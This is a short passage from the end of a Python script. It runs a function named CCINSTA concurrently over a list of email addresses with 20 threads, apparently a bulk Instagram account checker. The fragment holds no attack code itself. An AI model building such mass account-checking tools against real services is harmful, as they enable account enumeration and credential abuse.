	    with ThreadPoolExecutor(max_workers=20) as executor:
	        executor.map(CCINSTA, all_emails)
	
	if __name__ == "__main__":
	    main()
